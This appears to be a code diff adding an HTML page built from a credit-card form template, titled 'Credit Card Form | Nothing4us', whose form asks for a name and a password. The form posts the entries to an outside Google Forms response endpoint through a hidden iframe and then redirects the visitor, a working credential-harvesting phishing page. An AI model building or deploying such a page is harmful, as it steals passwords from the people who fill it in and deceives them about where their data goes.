@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Template</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <!-- partial:index.partial.html -->
+  <!DOCTYPE html>
+  <html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title> Credit Card Form | Nothing4us </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+    <link rel="stylesheet" href="./style.css">
+
+  </head>
+
+  <body>
+    <!-- partial:index.partial.html -->
+    <div class="wrapper" id="app">
+      <div class="card-form">
+
+        <div class="card-form__inner">
+          <img src="./404.png" alt="logo" class="logo">
+          <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"
+            onload="if(submitted)  {window.location='http://127.0.0.1:5500/submit.html';}"></iframe>
+          <form id="form"
+            action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdySODN_QZnitKG-OJxlG3mncLUEMoB64eUTUWPDP_D4BehEQ/formResponse"
+            method="post" target="hidden_iframe" class="form-horizontal" onsubmit="submitted=true;">
+            <div class="card-input">
+              <label for="cardNumber" class="card-input__label">Name</label>
+              <input type="text" name="entry.600112525" id="cardNumber" class="card-input__input">
+            </div>
+            <div class="card-input">
+              <label for="cardName" class="card-input__label">Password</label>
+              <input type="text" name="entry.1735448407" id="cardName" class="card-input__input">
+            </div>
+            <button class="card-form__button" type="submit" form="form">
+              Submit
+            </button>
+          </form>
+        </div>
+      </div>
+
+
+    </div>
+  </body>
+
+  </html>
+
+</body>
+
+</html>
